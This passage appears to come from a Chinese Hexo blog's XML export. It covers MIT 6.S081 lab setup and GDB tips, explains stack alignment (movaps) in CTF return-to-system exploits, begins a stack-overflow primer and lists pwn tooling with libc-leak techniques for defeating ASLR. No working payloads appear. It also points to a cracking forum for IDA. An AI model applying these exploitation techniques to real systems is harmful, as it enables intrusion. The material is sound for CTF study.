href="https://www.youtube.com/playlist?list=PLbtzT1TYeoMhTPzyTZboW_j7TPAnjv9XB">https://www.youtube.com/playlist?list=PLbtzT1TYeoMhTPzyTZboW_j7TPAnjv9XB</a> (推荐)</li><li>实验讲解: <a href="https://www.bilibili.com/video/BV1ou41127p9/?vd_source=c35e5a8a155a8438a63d9b344d7ea4cc">https://www.bilibili.com/video/BV1ou41127p9/?vd_source=c35e5a8a155a8438a63d9b344d7ea4cc</a></li><li>同讲解：<a href="https://space.bilibili.com/16765968">https://space.bilibili.com/16765968</a></li><li>xv6-rust实现: <a href="https://github.com/KuangjuX">https://github.com/KuangjuX</a></li></ul><h3 id="一些可参考博客">一些可参考博客</h3><ul><li><a href="https://doraemonzzz.com/tags/6-S081/">doraemonzzz</a></li><li><a href="https://fanxiao.tech/posts/2021-03-02-mit-6s081-notes/">fanxiao</a></li><li><a href="https://blog.miigon.net/categories/mit6-s081/">miigon</a></li><li><a href="https://walkerzf.github.io/categories/6-S081/index.html">walkerzf</a></li><li><a href="https://blog.csdn.net/u013577996/article/details/108679997">解析</a></li><li><a href="https://github.com/PKUFlyingPig/MIT6.S081-2020fall">PKUFlyingPig</a></li><li><a href="https://www.cnblogs.com/weijunji/tag/XV6/">星见遥</a></li><li><a href="https://ttzytt.com/tags/xv6/">tzyt</a></li></ul><h2 id="实验环境配置">实验环境配置</h2><p><a href="https://pdos.csail.mit.edu/6.828/2021/tools.html">指南</a></p><p>ubuntu安装(windows wsl如果使用的是ubuntu镜像，也是这个用法)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu</span><br></pre></td></tr></table></figure><p>如果出现qemu卡在最后一步启动shell，可以试试降低qemu版本到实验指定的版本或者提升xv6的版本(可以试试比较新的代码，2021版貌似修复了这个问题)，后续可能会研究一下这个问题(大概，心虚)。</p><p>其他问题可以按照<a href="https://pdos.csail.mit.edu/6.828/2021/tools.html">官网</a>的方法逐个排查，或者看<a href="https://tarplkpqsm.feishu.cn/docs/doccnBFsXFMsAr1oXEVsaT9E3Jg">飞书文档</a>。</p><h2 id="实验说明">实验说明</h2><p>直接翻译自<a href="https://pdos.csail.mit.edu/6.828/2023/labs/guidance.html">官网</a>，以下内容值得阅读。</p><h3 id="实验难度">实验难度</h3><p>每个实验都具有相应的难度</p><ul><li>Easy：不到一个小时。热身。</li><li>Moderate：1-2小时。</li><li>Hard：超过2个小时。这些练习通常不需要很多代码，但是代码很难正确。</li></ul><p>这些时间只是粗略估计。对于一些可选作业，没有答案，难度只是胡乱猜测。<br>这些实验通常不需要很多代码(几十到几百行) ，但是在概念上很复杂，而且细节很重要。所以，在你写任何代码之前，一定要完成指定的阅读，通读相关文件，查阅文档(RISC-V手册等存放在了<a href="https://pdos.csail.mit.edu/6.828/2023/reference.html">参考页面</a>上)。只有当你确实掌握了任务及其解决方案，再开始编码。当你开始编写代码的时候，一小步一小步地实现你的解决方案(作业通常会建议如何将问题分解为更小的步骤)，并且在继续下一个步骤之前测试每个步骤是否正常工作。</p><blockquote><p>警告:不要在实验截止日期的前一天晚上开始实验;在数天内分批次完成实验更节省时间。操作系统内核中错误的表现形式可能令人困惑，需要经过深思熟虑和仔细调试才能理解和修复。 引用这段话的目的是为了警醒我不要再鸽了。</p></blockquote><h3 id="调试技巧-重要">调试技巧(重要)</h3><p>1.确保你真正理解了C和指针。Kernighan和Ritchie的《C程序设计语言》一书对C语言进行了简要的描述。这里有一些有用的指针练习。不要跳过或略读以下的指针练习，除非你已经完全掌握了C语言。如果你不能真正理解C语言中的指针，你将在实验中遭受难以言喻的痛苦，最终以一种艰难的方式来理解它们。相信我们，你不会想知道什么是“艰难的路”的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">4</span>];</span><br><span class="line">    <span class="type">int</span> *b = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="type">int</span> *c;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1: a = %p, b = %p, c = %p\n&quot;</span>, a, b, c);</span><br><span class="line"></span><br><span class="line">    c = a;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    a[i] = <span class="number">100</span> + i;</span><br><span class="line">    c[<span class="number">0</span>] = <span class="number">200</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n&quot;</span>,</span><br><span class="line">   a[<span class="number">0</span>], a[<span class="number">1</span>], a[<span class="number">2</span>], a[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    c[<span class="number">1</span>] = <span class="number">300</span>;</span><br><span class="line">    *(c + <span class="number">2</span>) = <span class="number">301</span>;</span><br><span class="line">    <span class="number">3</span>[c] = <span class="number">302</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;3: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n&quot;</span>,</span><br><span class="line">   a[<span class="number">0</span>], a[<span class="number">1</span>], a[<span class="number">2</span>], a[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    c = c + <span class="number">1</span>;</span><br><span class="line">    *c = <span class="number">400</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n&quot;</span>,</span><br><span class="line">   a[<span class="number">0</span>], a[<span class="number">1</span>], a[<span class="number">2</span>], a[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    c = (<span class="type">int</span> *) ((<span class="type">char</span> *) c + <span class="number">1</span>);</span><br><span class="line">    *c = <span class="number">500</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;5: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n&quot;</span>,</span><br><span class="line">   a[<span class="number">0</span>], a[<span class="number">1</span>], a[<span class="number">2</span>], a[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    b = (<span class="type">int</span> *) a + <span class="number">1</span>;</span><br><span class="line">    c = (<span class="type">int</span> *) ((<span class="type">char</span> *) a + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;6: a = %p, b = %p, c = %p\n&quot;</span>, a, b, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> ac, <span class="type">char</span> **av)</span></span><br><span class="line">&#123;</span><br><span class="line">    f();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一些习惯用法特别值得记住:</p><ul><li>如果<code>int *p = (int*)100</code>，那么<code>(int)p + 1</code>及<code>(int)(p + 1)</code>是不同的，第一个是101，但第二个是104。当向指针添加一个整数时，如第二种情况，整数被隐式地乘以指针指向的对象的大小。</li><li><code>p[i]</code>被定义为与<code>*(p+i)</code>相同，指向内存中p指向的第i个元素，当元素大于1字节时，上面所说的加法规则有利于此定义工作。</li><li><code>&amp;p[i]</code>等同于<code>(p+i)</code><br>大多数C程序并不需要在指针和整数之间进行强制转换，但操作系统经常需要这样做。每当您看到一个包含内存地址的加法时，问问自己它是整数加法还是指针加法，并确保所添加的值是否适当地相乘。</li></ul><p>2.如果您完成了一部分练习，请通过提交代码来检查你的进度。如果您稍后修改了某些东西，那么您可以回滚到您的检查点，然后以较小的改动继续前进。要了解关于Git的更多信息，请查看<a href="https://mirrors.edge.kernel.org/pub/software/scm/git/docs/user-manual.html">Git用户手册</a>，这个<a href="https://eagain.net/articles/git-for-computer-scientists/">面向计算机科学家的Git概述</a>也非常有用。<br>3.如果您没有通过测试，确保您了解为什么您的代码没有通过测试。插入<code>printf</code>语句，直到您理解发生了什么。<br>4.您可能会发现您的<code>printf</code>语句可能会产生许多您想要搜索的输出；其中一种方法是在<code>script</code>内部运行<code>make qemu</code>(在您的机器上运行<code>man script</code>)，它将所有控制台输出记录到一个文件中，然后您可以搜索该文件。别忘了退出<code>script</code>。(也许grep也可以？)<br>5.在多数情况下，<code>printf</code>语句就足够了，但有时我们希望可以单步遍历一些汇编代码或检查堆栈上的变量。要在xv6中使用gdb，请在一个窗口中运行<code>make qemu-gdb</code>，在另一个窗口中运行<code>gdb-multiarch</code>(或<code>riscv64-linux-gnu-gdb</code>)，设置断点，后跟<code>c</code>(continue)，xv6将一直运行，直到到达断点。(有关有用的GDB提示，请参阅<a href="https://pdos.csail.mit.edu/6.828/2019/lec/gdb_slides.pdf">使用GNU调试器</a>和<a href="https://pdos.csail.mit.edu/6.828/2023/labs/gdb.html">tips</a>)。如果你看到形如&quot;warning: File “…/.gdbinit” auto-loading has been declined&quot;的错误，编辑<code>~/.gdbinit</code>，添加&quot;add-auto-load-safe-path…&quot;。<br>6.如果希望查看编译器为xv6内核生成的汇编代码，或者查找特定内核地址处的指令，请参阅文件<code>kernel/kernel.asm</code>，这个文件会在make的过程中产生。（其他程序也有对应的<code>.asm</code>文件）<br>7.如果内核出现了意外错误(例如访问无效的内存地址)，它将在崩溃点打印一条错误消息，其中包括程序计数器(“sepc”); 可以搜索<code>kernel.asm</code>查找程序计数器崩溃时在哪个函数，或者您可以运行<code>addr2line -e kernel/kernel $&#123;pc-value&#125;</code>(运行<code>man addr2line</code>了解详细信息)。如果你想获得错误的详细信息，使用gdb重新启动:在一个窗口中运行<code>make qemu-gdb</code>，在另一个窗口中运行<code>gdb-multiarch</code>(或<code>riscv64-linux-gnu-gdb</code>)，在panic (<code>b panic</code>)中设置断点，然后在后面跟着<code>c</code> (continue)。当内核到达断点时，输入<code>bt</code>以获得信息。<br>8.如果您的内核挂起(例如，由于死锁)，您可以使用gdb查找挂起的位置。在一个窗口中运行<code>make qemu-gdb</code>，在另一个窗口中运行<code>gdb-multiarch</code>(或<code>riscv64-linux-gnu-gdb</code>)，后跟<code>c</code>(continue)。当挂起发生时，在qemu-gdb窗口<code>ctrl+c</code>停止运行，然后输入<code>bt</code>以获得信息。<br>9.<code>qemu</code>有一个“监视器”，允许您查询虚拟机的状态。您可以通过输入<code>control-a c</code>（c表示控制台）来使用它。一个特别有用的monitor命令是<code>info mem</code>，用于打印页表。您可能需要使用<code>cpu</code>命令来选择<code>info mem</code>查看哪一个核心，或者可以使用<code>make CPUS=1 qemu</code>启动qemu，以使其只有一个核心。</p><h3 id="在实验中使用GDB">在实验中使用GDB</h3><p>在一个窗口中操作(确保在<code>xv6-labs-2023</code>目录下)使用<code>make qemu-gdb</code>，注意输出的最后一行会包含<code>tcp::&lt;PORT NUMBER HERE&gt;</code>。<br>在第二个窗口中使用<code>riscv64-linux-gnu-gdb</code>(或者<code>gdb-multiarch</code>)，在gdb界面输入<code>target remote localhost:&lt;PORT NUMBER ABOVE&gt;</code><br>假设您想在内核每次进入函数sycall(在从kernel/sycall.c)时中断：</p><ul><li>在gdb界面输入<code>file kernel/kernel</code> (这是包含了所有kernel代码的二进制文件)</li><li>在gdb界面输入<code>b syscall</code></li><li><code>c</code>运行</li></ul><p>假设您想在<code>user/ls.c</code>的ls中设置断点，可以输入<code>file user/_ls</code>和<code>b ls</code></p><h3 id="使用GDB的常见问题">使用GDB的常见问题</h3><ol><li>从错误的目录运行GDB。您需要在<code>xv6-labs-2023</code>目录下运行<code>make qemu-gdb</code>和<code>riscv64-linux-gnu-gdb</code>(或者<code>gdb-multiarch</code>)。不是在<code>~</code>中，也不是在<code>xv6-labs-2023/kernel</code>或<code>xv6-labs-2023/user</code>中。比如以下的惨痛教训。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/MIT6-S081-1/2024-09-01%20215225.png" alt="惨痛教训"></li><li>运行错误的GDB类型。<code>gdb</code>命令通常无法直接识别RISC-V的机器码。你需要<code>riscv64-linux-gnu-gdb</code>(或者<code>gdb-multiarch</code>)</li><li>GDB无法找到您要调试的内容。您可能需要运行<code>target remote localhost:&lt;对应目标的端口号&gt;</code></li><li>未添加要调试的文件。如果您得到关于运行<code>file</code>命令或未知符号的错误，则需要运行<code>file kernel/kernel</code>，以便gdb知道在哪里查找要调试的代码。</li><li>如果退出GDB，然后重新运行<code>riscv64-linux-gnu-gdb</code>(或者<code>gdb-multiarch</code>)，而不重新运行<code>make qemu-gdb</code>，可能会出问题（大概率不会），这时候需要将两个都重启。</li><li>刚开始使用GDB是很烦人的，但它在后来的实验中非常非常有帮助，知道基本的命令可以在以后的调试中减少痛苦。</li></ol>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>missing-semester学习（二）</title>
      <link href="/2022/10/missing-semester-2/"/>
      <url>/2022/10/missing-semester-2/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> missing-semester </category>
          
      </categories>
      
      
        <tags>
            
            <tag> missing-semester </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>missing-semester学习（一）</title>
      <link href="/2022/10/missing-semester-1/"/>
      <url>/2022/10/missing-semester-1/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> missing-semester </category>
          
      </categories>
      
      
        <tags>
            
            <tag> missing-semester </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>how2heap学习笔记（一）</title>
      <link href="/2022/10/how2heap1/"/>
      <url>/2022/10/how2heap1/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串</title>
      <link href="/2022/07/Format-String/"/>
      <url>/2022/07/Format-String/</url>
      
        <content type="html"><![CDATA[<p>把hexo的post_assert_folder打开了，下次一定好好传图😭😭😭<br>一般来说第一次加载比较慢，后续会好很多。（感谢缓存机制）<br>后续可能整个图床？</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu18及以上堆栈平衡的问题</title>
      <link href="/2022/07/some-problems-about-movaps/"/>
      <url>/2022/07/some-problems-about-movaps/</url>
      
        <content type="html"><![CDATA[<p>在做pwn题时常常遇到了明明填充数据长度和函数地址填写的都是对的，却总是打不进去的情况。</p><h2 id="问题定位">问题定位</h2><p>调试程序，发现在执行<code>system</code>函数时，执行到<code>movaps</code>指令产生了错误导致程序停止。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/some-problems-about-movaps/2024-09-2802-08-10.png" alt=""></p><h2 id="RTFM">RTFM</h2><p>以下是<a href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html">Intel x64</a>文档（第五章指令集介绍）中对<code>movaps</code>的描述<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/some-problems-about-movaps/2024-09-28010551.png" alt=""><br>简单来说就是<code>movaps</code>操作的内存地址必须是16字节对齐的，否则会出现<code>#GP</code>异常。所以为什么会出问题，答案不言自明。<br>以下补充了一些文档中的相关内容，可能解释了为什么要用该指令（原子性操作保证，高速缓存支持和更快的性能）<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/some-problems-about-movaps/2024-09-28013925.png" alt=""><br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/some-problems-about-movaps/2024-09-28014439.png" alt=""></p><h2 id="如何对齐">如何对齐</h2><p>根据上面的分析，当执行到<code>movaps</code>语句时，只有当<code>rsp</code>地址的末尾是0的时候，才算是与16字节对齐了，如果末尾是8的话，那就是没有对齐。此处<code>rsp</code>地址明显没有对齐<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/some-problems-about-movaps/2024-09-2802-12-31.png" alt=""><br>如果执行或跳过了一个对栈的操作指令（比如<code>pop</code>,<code>ret</code>,<code>push</code>等），那么栈地址就会+8或是-8。为使<code>rsp</code>对齐16字节，核心思想就是增加或减少栈内容，使<code>rsp</code>地址能相应的增加或减少8字节，这样就能够对齐16字节了。因为栈中地址都是以0或8结尾，因此只需要进行奇数次操作，就能把地址是8结尾的<code>rsp</code>变为0结尾，使其16字节对齐。<br>有两种方法</p><ol><li>调用后门函数地址+1。因为在一些情况（不是全部）下后门函数第一条指令是<code>push ebp</code>，正好占一个字节，<code>+1</code>可以正好跳过这个栈操作，使得地址对齐。缺点是不经常适用，因为函数可能不包含我们可以控制的栈操作，也可能栈操作不止一个字节（如果是这种情况，多加点就行了），比如下图中我们直接跳转到<code>system</code>函数中，跳转后执行的流程中没有我们可以控制的栈操作（跳转到<code>do_system</code>函数后的栈操作我们无法控制）。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/some-problems-about-movaps/2024-09-2802-59-11.png" alt=""></li><li>直接在调用<code>system</code>函数地址之前调用一个<code>ret</code>指令。执行一条对栈操作指令（<code>ret</code>指令等同于pop rip，该指令使得rsp+8，从而完成16字节对齐）就完成了栈对齐。</li></ol>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态链接过程</title>
      <link href="/2022/07/dynamic-linking/"/>
      <url>/2022/07/dynamic-linking/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出原理</title>
      <link href="/2022/07/stack-overflow/"/>
      <url>/2022/07/stack-overflow/</url>
      
        <content type="html"><![CDATA[<h2 id="栈的创建与销毁">栈的创建与销毁</h2><p>先复习一下栈的创建与销毁过程</p><h3 id="传参">传参</h3><p>x86下传参方式是将函数依次压入栈中。<br>如果一个函数声明为fun(arg1,arg2,arg3,arg4,…,argn),则在调用fun函数时，会使用<code>push</code>指令依次将argn,…,arg4,arg3,arg2,arg1压入栈中。<br>即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push argn</span><br><span class="line">……</span><br><span class="line">push arg1</span><br></pre></td></tr></table></figure><p>如果是linux/macos下的x64指令（windows好像有其他规定），则前6个参数依次放入rdi, rsi, rdx, rcx, r8, r9，从第七个参数开始按照x86的方式逆序入栈<br>若有一个函数fun(arg1,arg2,arg3,arg4,arg5,arg6…,argn)<br>arg1-&gt;%rdi,arg2-&gt;%rsi,arg3-&gt;%rdx,arg4-&gt;%rcx,arg5-&gt;%r8,arg6-&gt;%r9，<br>剩下的参数依次push进栈中。（有点类似于fastcall）<br>关于传参可以参考</p><h3 id="call-函数">call 函数</h3><p>call函数包含了两步</p><ul><li>将此时eip(或rip，即程序计数寄存器)中的值压入栈中。栈溢出常在此处做文章。</li><li>跳转到函数的执行位置。</li></ul><h3 id="push-ebp-rbp">push ebp(rbp)</h3><p>这一步是保存主调函数的</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn所需环境</title>
      <link href="/2022/07/pwn-environment/"/>
      <url>/2022/07/pwn-environment/</url>
      
        <content type="html"><![CDATA[<p>装新电脑需要配环境，就补一下。使用的环境是Ubuntu 22, 18和20的安装方法同下，16的环境试了很久，还是不行。<br>持续更新。用到的时候再补吧（咕咕咕）</p><h2 id="pwntools">pwntools</h2><p>直接用pip下载pwntools即可（注意关注pip版本）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pwntools</span><br></pre></td></tr></table></figure><p>下载完可以在python中尝试导入pwn模块，没有报错就是胜利。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br></pre></td></tr></table></figure><p>当然，下载完pwntools后，会有一些附带的有用工具，比如<code>checksec</code>。<br>checksec使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn checksec file</span><br></pre></td></tr></table></figure><h2 id="IDA">IDA</h2><p>52破解上直接下。我这里直接下在本机上了。</p><h2 id="pwndbg">pwndbg</h2><p>pwndbg是调试工具gdb的一个插件，拥有更强大的功能<br>按照官方的安装方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>通常情况下，执行完上述命令后，使用<code>gdb</code>即可使用pwndbg。（毕竟pwndbg就是gdb的一个插件嘛）<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/pwn-environment/%E2%95%9E%E2%94%B4%E2%94%80%E2%95%97%E2%95%9C%E2%95%AA%E2%95%90%E2%95%9D%202023-11-27%20194455.png" alt="效果"><br>如果遇到gdb没有自动启用pwndbg的情况，可以用以下方法处理。<br>下图说明gdb没有启用pwndbg插件（进入原生的gdb）。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/pwn-environment/%E2%95%9E%E2%94%B4%E2%94%80%E2%95%97%E2%95%9C%E2%95%AA%E2%95%90%E2%95%9D%202023-11-27%20200406.png" alt="效果"><br>在启动时，gdb通常会处理一个名为<code>.gdbinit</code>的初始化文件，gdb会在当前目录和home目录下寻找该初始化文件（home目录的优先级高于当前目录），并把它的内容作为gdb命令进行解释。<br>pwndbg在安装时会生成一个<code>.gdbinit</code>文件，用于加载执行pwndbg文件夹下的脚本。当我们使用<code>root</code>权限执行安装命令时，会在<code>/root</code>文件夹下生成<code>.gdbinit</code>文件，而用户文件夹下没有。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/pwn-environment/%E2%95%9E%E2%94%B4%E2%94%80%E2%95%97%E2%95%9C%E2%95%AA%E2%95%90%E2%95%9D%202023-11-27%20200442.png" alt="查看"><br>因此我们只需要把<code>/root</code>下的<code>.gdbinit</code>复制到用户文件夹下即可。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/pwn-environment/%E2%95%9E%E2%94%B4%E2%94%80%E2%95%97%E2%95%9C%E2%95%AA%E2%95%90%E2%95%9D%202023-11-27%20200534.png" alt="复制"><br>就可以使用pwndbg了。</p><h2 id="ROPgadget">ROPgadget</h2><p>ROPgadget是一款可以在二进制文件中搜索gadget的工具，可以便于我们实现ROP<br>因为ROPgadget基于python3开发，因此使用以下命令即可安装。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install ROPgadget</span><br></pre></td></tr></table></figure><p>如果缺少库可以根据官方文档补充。<br>在安装过程中遇到了以下报错<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/pwn-environment/%E2%95%9E%E2%94%B4%E2%94%80%E2%95%97%E2%95%9C%E2%95%AA%E2%95%90%E2%95%9D%202023-11-27%20194511.png" alt="报错"><br>使用<code>find / -name ROPgadget</code>查找相关文件夹<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/pwn-environment/%E2%95%9E%E2%94%B4%E2%94%80%E2%95%97%E2%95%9C%E2%95%AA%E2%95%90%E2%95%9D%202023-11-27%20194523.png" alt="查找结果"><br>使用<code>cp -r</code>命令将<code>ROPgadget/scripts</code>文件夹复制到报错显示的文件夹下，即可解决问题<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/pwn-environment/%E2%95%9E%E2%94%B4%E2%94%80%E2%95%97%E2%95%9C%E2%95%AA%E2%95%90%E2%95%9D%202023-11-27%20194455.png" alt="解决"></p><h2 id="onegadget">onegadget</h2><p>使用以下命令安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install one_gadget</span><br></pre></td></tr></table></figure><p>接着直接使用，即可直接查看<code>gadget</code>，通常我们查看<code>libc</code>文件，因为<code>libc</code>中存在的one_gadget（直接调用类似于<code>execve('/bin/sh', 0, 0)</code>的语句）比较多。不过需要注意的是，触发one_gadget往往需要满足特定的条件，因此需要耐心调试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget file</span><br></pre></td></tr></table></figure><p>效果如下图,包含了one_gadget的偏移地址以及<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/pwn-environment/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-24%20220241.png" alt="使用效果"></p><h2 id="LibcSearch">LibcSearch</h2><p>直接上网 <a href="https://libc.blukat.me/">https://libc.blukat.me/</a> (打开比较慢)<br>因为在不同libc中，代码会有不同，因此库中的函数偏移量可能不同。函数的偏移量可以作为libc版本的特征，从而帮助我们推测出libc的版本。<br>页是linux内核管理物理内存的最小单位，内核将整个物理内存按照页对齐方式划分成千上万个页进行管理。因为linux内核中页对齐机制的存在，ASLR（地址随机化）不会影响低12位（linux中页的大小时4KB）。因此在攻击中，我们通常需要泄露部分函数的地址，取出后三字节，并依据这些信息，获取该函数在libc中的偏移量以及我们需要的特定函数与字符串的地址(<code>system('/bin/sh')</code>)。通过LibcSearch（或者说上面的网站）可以推测出较为准确的libc版本。<br>使用方法如下，只需要输入函数名称与后三字节即可。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/pwn-environment/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-12-12%20224505.png" alt="使用示例"></p><h2 id="Patchelf-glibc-all-in-one">Patchelf &amp;&amp; glibc-all-in-one</h2><p>经常会碰到因为libc版本不一致打不通的情况，这两个工具组合可以解决libc版本不一致的问题。<br><code>patchelf</code>直接apt安装即可，比较方便。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install patchelf</span><br></pre></td></tr></table></figure><p><code>glibc-all-in-one</code>安装也比较方便，直接<code>git clone https://github.com/matrix1001/glibc-all-in-one.git</code>即可<br>使用<code>./update_list</code>更新List，接着使用<code>cat list</code>或<code>cat old_list</code>即可查看libc版本<br>下载是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./download libc_version</span><br></pre></td></tr></table></figure><p><code>patchelf</code>主要用来修改程序的链接路径或依赖库信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ld_path elf_path</span><br><span class="line">patchelf --set-rpath libc_path elf_path</span><br></pre></td></tr></table></figure><p>我在比赛中发现也可以这么改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ld_path elf_path</span><br><span class="line">patchelf --replace-needed libc.so.6 libc_path elf_path</span><br></pre></td></tr></table></figure><p>使用后可以使用<code>ldd</code>查看效果<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/pwn-environment/%E6%88%AA%E5%9B%BE%202024-09-24%2022-25-31.png" alt="效果"></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ pwn wp 2</title>
      <link href="/2022/07/buuoj-pwn-wp2/"/>
